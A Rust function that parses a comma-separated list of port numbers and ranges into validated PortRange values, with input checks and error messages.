pub fn parse_ports(input: &str) -> Result<Vec<PortRange>, Vec<u8>> {
    let mut ports = Vec::new();

    for token in input.split(',') {
        let token = token.trim();
        if token.is_empty() {
            continue;
        }

        let (start, end) = if let Some(dash_pos) = token.find('-') {
            let start_str = &token[..dash_pos];
            let end_str = &token[dash_pos + 1..];

            let start: u32 = start_str
                .trim()
                .parse()
                .map_err(|_| b"Invalid port number".to_vec())?;
            let end: u32 = end_str
                .trim()
                .parse()
                .map_err(|_| b"Invalid port number".to_vec())?;

            if !is_port_valid(start) || !is_port_valid(end) {
                return Err(b"Port out of range".to_vec());
            }

            (start as u16, end as u16)
        } else {
            let port: u32 = token
                .parse()
                .map_err(|_| b"Invalid port number".to_vec())?;

            if !is_port_valid(port) {
                return Err(b"Port out of range".to_vec());
            }

            (port as u16, port as u16)
        };

        // Swap if start > end
        let (start, end) = if start <= end {
            (start, end)
        } else {
            (end, start)
        };

        ports.push(PortRange { start, end });
    }

    if ports.is_empty() {
        return Err(b"No valid ports parsed".to_vec());
    }

    Ok(ports)
}